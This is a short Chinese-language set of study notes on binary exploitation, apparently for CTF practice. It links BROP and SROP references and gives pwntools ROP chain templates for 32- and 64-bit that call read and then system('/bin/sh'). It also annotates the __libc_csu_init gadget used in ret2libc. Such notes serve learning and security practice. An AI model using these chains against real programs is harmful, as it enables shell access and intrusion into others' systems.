## brop
http://www.scs.stanford.edu/brop/

## srop
https://www.freebuf.com/articles/network/87447.html
https://blog.csdn.net/qq_29343201/article/details/72627439
## 通用技术
常用的栈布局如下
```py
# 32位
flat(
    [
    read_addr,
    system_addr,
    0, #read 函数一个参数 fd/system返回地址
    binsh_addr #read第二个参数/system第一个参数
    ]
)
# 64位
flat(
    [
        pop_edi,
        0, //read第一个参数 fd
        pop_rsi,
        binsh_addr, #read第二个参数 sh字符串地址
        pop_rdx, 
        20,      #read第三个参数 长度
        read_addr,
        pop_rdi, 
        binsh_addr,# system第一个参数
        system_addr,
    ]
)
```
## ret2libc
64下通用gadget,`__libc_csu_init`,一共两端代码，可以设置三个寄存器传参的值
```asm
;第一段代码gad1
  pop     rbx  ;必须为0
  pop     rbp  ;必须为1
  pop     r12  ;你call函数的地址(应该是got上的?)
  pop     r13  ;arg3
  pop     r14  ;arg2
  pop     r15  ;arg1
  retn         ;gad2
```

```asm
;第二段代码gad2
mov     rdx, r13
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8] call!!!
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_400880
add     rsp, 8
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15 ;这个地方可以构造错位gadgets,恰好可以构造为pop rdi,ret
retn     ;构造一些垫板(7*8=56byte)，因为后面后面还有很多pop+rbp+ret
```